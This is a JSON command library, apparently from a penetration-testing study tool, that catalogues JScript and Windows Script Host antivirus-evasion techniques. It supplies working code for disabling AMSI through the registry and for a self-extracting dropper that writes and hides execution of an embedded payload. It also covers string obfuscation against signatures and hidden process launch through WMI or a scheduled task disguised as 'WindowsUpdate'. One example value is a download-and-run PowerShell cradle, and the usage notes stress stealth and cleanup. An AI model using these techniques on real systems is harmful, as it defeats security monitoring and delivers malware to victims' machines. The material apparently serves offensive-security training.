{
  "category": "JScript/WSH Evasion",
  "description": "JScript and VBScript evasion techniques for Windows Script Host (WSH). Includes AMSI bypass, self-modifying executables, and COM object exploitation.",
  "commands": [
    {
      "id": "jscript-amsi-registry-bypass",
      "name": "JScript AMSI Registry Bypass",
      "description": "Disable AMSI for JScript/VBScript by setting AmsiEnable registry value to 0. Requires user-level registry access (HKCU). Persists until key removed.",
      "category": "jscript-evasion",
      "tags": [
        "anti-virus",
        "AV",
        "evasion",
        "jscript",
        "amsi",
        "registry",
        "wsh",
        "windows"
      ],
      "command": "var sh = new ActiveXObject(\"WScript.Shell\");\nvar key = \"HKCU\\\\Software\\\\Microsoft\\\\Windows Script\\\\Settings\\\\AmsiEnable\";\ntry {\n    var val = sh.RegRead(key);\n    if(val != 0) {\n        sh.RegWrite(key, 0, \"REG_DWORD\");\n    }\n} catch(e) {\n    sh.RegWrite(key, 0, \"REG_DWORD\");\n}\nWScript.Echo(\"AMSI disabled for WSH\");",
      "variables": [],
      "notes": "Syntax: Save as .js file, execute with wscript.exe or cscript.exe Useful for VBA -> JScript attack chains. Persistent (survives reboot) - good and bad. Remember to clean up. See also: amsi-jscript-registry in amsi-bypass module. Time estimate: 2 minutes References: docs/av-evasion/jscript-evasion.md#amsi-registry-bypass, amsi-bypass.json#amsi-jscript-registry, PEN-300 Chapter 7.6.2 Manual alternative: Execute JScript from non-AMSI context, use COM objects, or compile to .exe with JScript.NET",
      "success_indicators": [
        "Registry key set to 0. AMSI disabled for current user's WSH sessions. Persists across reboots."
      ],
      "failure_indicators": [
        "Registry access denied - Rare for HKCU, check user permissions",
        "Key persists after operation - Clean up with RegDelete for stealth",
        "Doesn't affect PowerShell - Only disables AMSI for JScript/VBScript, not PowerShell"
      ]
    },
    {
      "id": "jscript-self-modifying-exe",
      "name": "JScript Self-Modifying Executable",
      "description": "Concatenate JScript dropper with embedded payload into single executable. WSH script reads own file, extracts embedded payload, writes to disk and executes. Evades initial AMSI scan.",
      "category": "jscript-evasion",
      "tags": [
        "anti-virus",
        "AV",
        "evasion",
        "jscript",
        "self-modification",
        "wsh",
        "dropper"
      ],
      "command": "// Part 1: JScript dropper (beginning of .js file)\nvar fso = new ActiveXObject(\"Scripting.FileSystemObject\");\nvar sh = new ActiveXObject(\"WScript.Shell\");\n\n// Read own file\nvar scriptPath = WScript.ScriptFullName;\nvar file = fso.OpenTextFile(scriptPath, 1);\nvar content = file.ReadAll();\nfile.Close();\n\n// Extract payload after marker\nvar marker = \"###PAYLOAD###\";\nvar payloadStart = content.indexOf(marker) + marker.length;\nvar payload = content.substring(payloadStart);\n\n// Write payload to temp file\nvar tempPath = sh.ExpandEnvironmentStrings(\"%TEMP%\") + \"\\\\<OUTPUT_FILE>\";\nvar outFile = fso.CreateTextFile(tempPath, true);\noutFile.Write(payload);\noutFile.Close();\n\n// Execute payload\nsh.Run(tempPath, 0);\n\n// Part 2: Embedded payload (after JScript code)\nWScript.Quit();\n###PAYLOAD###\n<EMBEDDED_PAYLOAD_CONTENT>",
      "variables": [
        {
          "name": "<OUTPUT_FILE>",
          "description": "Output filename for extracted payload",
          "example": "payload.ps1",
          "required": true
        },
        {
          "name": "<EMBEDDED_PAYLOAD_CONTENT>",
          "description": "Payload content to embed after marker (PowerShell script, binary, etc.)",
          "example": "IEX (New-Object Net.WebClient).DownloadString('http://...')",
          "required": true
        }
      ],
      "notes": "Syntax: Create JScript dropper, append payload after marker, save as .js Creative evasion technique. Initial scan sees benign dropper. Payload extracted at runtime. Good for embedding PowerShell scripts or small executables. Test marker uniqueness. ~20 min to implement. Time estimate: 20 minutes References: docs/av-evasion/jscript-evasion.md#self-modifying, PEN-300 Chapter 7.6.3 Manual alternative: Use HTTP download instead of embedding, encrypted payload sections, or multi-stage loaders",
      "success_indicators": [
        "JScript reads itself, extracts embedded payload, writes to temp, executes. Initial AMSI scan only sees dropper code."
      ],
      "failure_indicators": [
        "Marker not found - Ensure marker string is unique and present",
        "File write fails - Check TEMP permissions",
        "Payload corrupted - Verify no encoding issues (use Base64 for binary)",
        "Still detected - Dropper code itself may be signatured"
      ]
    },
    {
      "id": "jscript-wsh-obfuscation",
      "name": "JScript String Obfuscation",
      "description": "Obfuscate suspicious strings in JScript using various encoding techniques. Evades simple string-based signatures.",
      "category": "jscript-evasion",
      "tags": [
        "anti-virus",
        "AV",
        "evasion",
        "jscript",
        "obfuscation",
        "string-encoding",
        "wsh"
      ],
      "command": "// Method 1: String.fromCharCode()\nvar cmd = String.fromCharCode(112,111,119,101,114,115,104,101,108,108); // \"powershell\"\n\n// Method 2: String concatenation\nvar cmd = \"pow\" + \"er\" + \"shell.exe\";\n\n// Method 3: Array join\nvar parts = [\"pow\", \"er\", \"shell\"];\nvar cmd = parts.join(\"\") + \".exe\";\n\n// Method 4: Base64 decode (custom function)\nfunction b64decode(str) {\n    var b64 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\";\n    var decoded = \"\";\n    // Decode implementation...\n    return decoded;\n}\nvar cmd = b64decode(\"cG93ZXJzaGVsbC5leGU=\");",
      "variables": [],
      "notes": "Syntax: Apply to suspicious strings in JScript code Quick win for JScript payloads. Always obfuscate 'powershell', 'cmd', 'http', 'eval'. Use random variable names. String.fromCharCode() most effective. ~10 min to apply. Time estimate: 10 minutes References: docs/av-evasion/jscript-evasion.md#obfuscation Manual alternative: Use eval() with encoded strings, external config files, or hex encoding",
      "success_indicators": [
        "Obfuscated strings bypass simple pattern matching. Code executes normally."
      ],
      "failure_indicators": [
        "fromCharCode() with wrong values - Verify ASCII codes",
        "Obfuscation detected by heuristics - Combine with AMSI bypass",
        "Still flagged - Use multiple obfuscation layers"
      ]
    },
    {
      "id": "jscript-com-execution",
      "name": "JScript COM Object Execution",
      "description": "Execute commands via COM objects instead of direct Shell.Run(). Uses WMI, Task Scheduler, or other COM interfaces to break behavioral patterns.",
      "category": "jscript-evasion",
      "tags": [
        "anti-virus",
        "AV",
        "evasion",
        "jscript",
        "com",
        "wmi",
        "wsh"
      ],
      "command": "// Method 1: WMI Process Creation\nvar wmi = GetObject(\"winmgmts:\\\\\\\\.\\\\root\\\\cimv2\");\nvar startup = wmi.Get(\"Win32_ProcessStartup\").SpawnInstance_();\nstartup.ShowWindow = 0; // Hidden\nvar process = wmi.Get(\"Win32_Process\");\nvar pid = {};\nprocess.Create(\"<COMMAND>\", null, startup, pid);\n\n// Method 2: Task Scheduler\nvar schedule = new ActiveXObject(\"Schedule.Service\");\nschedule.Connect();\nvar rootFolder = schedule.GetFolder(\"\\\\\");\nvar taskDef = schedule.NewTask(0);\nvar action = taskDef.Actions.Create(0); // Execute\naction.Path = \"<COMMAND>\";\nrootFolder.RegisterTaskDefinition(\"<TASK_NAME>\", taskDef, 6, null, null, 3);",
      "variables": [
        {
          "name": "<COMMAND>",
          "description": "Command to execute",
          "example": "powershell.exe -nop -w hidden -c ...",
          "required": true
        },
        {
          "name": "<TASK_NAME>",
          "description": "Scheduled task name (for Task Scheduler method)",
          "example": "WindowsUpdate",
          "required": false
        }
      ],
      "notes": "Syntax: Replace <COMMAND> with payload command COM execution breaks simple parent-child monitoring. WMI method more reliable than Task Scheduler. Clean up tasks after execution. Good for persistence too. ~15 min to implement. Time estimate: 15 minutes References: docs/av-evasion/jscript-evasion.md#com-execution Manual alternative: Use WScript.Shell.Exec(), CreateObject(\"Shell.Application\").ShellExecute(), or MMC20.Application COM object",
      "success_indicators": [
        "Command executes via COM interface. Breaks WScript.exe -> cmd.exe parent-child relationship monitored by AV."
      ],
      "failure_indicators": [
        "WMI access denied - Requires appropriate permissions",
        "Task Scheduler fails - Check task definition syntax",
        "COM object not available - Verify object exists on target system",
        "Still detected - Behavioral analysis may catch COM usage pattern"
      ]
    },
    {
      "id": "wscript-cscript-execution",
      "name": "WScript vs CScript Execution",
      "description": "Choose between WScript.exe (GUI) and CScript.exe (console) for JScript/VBScript execution. CScript better for stealth (no windows), WScript better for hidden execution.",
      "category": "jscript-evasion",
      "tags": [
        "anti-virus",
        "AV",
        "evasion",
        "jscript",
        "wsh",
        "execution",
        "windows"
      ],
      "command": "# Execute with WScript (GUI mode, hidden)\nwscript.exe //B //Nologo <SCRIPT_FILE>\n\n# Execute with CScript (console mode)\ncscript.exe //B //Nologo <SCRIPT_FILE>\n\n# Force hidden execution (WScript)\nwscript.exe //B //Nologo <SCRIPT_FILE>\n\n# Within script, check execution mode:\nvar isConsole = (WScript.FullName.toLowerCase().indexOf(\"cscript\") != -1);",
      "variables": [
        {
          "name": "<SCRIPT_FILE>",
          "description": "Path to .js or .vbs file",
          "example": "payload.js",
          "required": true
        }
      ],
      "notes": "Syntax: Execute from command line or within script WScript for GUI-less execution from shortcuts/scheduled tasks. CScript for command-line integration. Always use //B //Nologo for stealth. Test both modes - different behavioral signatures. Time estimate: 2 minutes References: docs/av-evasion/jscript-evasion.md#execution-modes Manual alternative: Use PowerShell Invoke-Expression, direct COM object instantiation, or mshta.exe for HTA execution",
      "success_indicators": [
        "Script executes via chosen engine. WScript: GUI mode, CScript: console mode."
      ],
      "failure_indicators": [
        "Popups appear - Use //B flag to suppress",
        "Script timeout - Increase //T value or remove timeout",
        "Encoding issues - Save as ANSI/ASCII, not UTF-8 with BOM"
      ]
    }
  ],
  "oscp_relevance": "Useful for alternative execution methods when PowerShell blocked. JScript often less monitored than PowerShell. Good for VBA -> JScript -> PowerShell attack chains.",
  "attack_chain_position": "Initial Access, Execution, Evasion",
  "related_categories": [
    "vba-evasion",
    "powershell",
    "windows"
  ]
}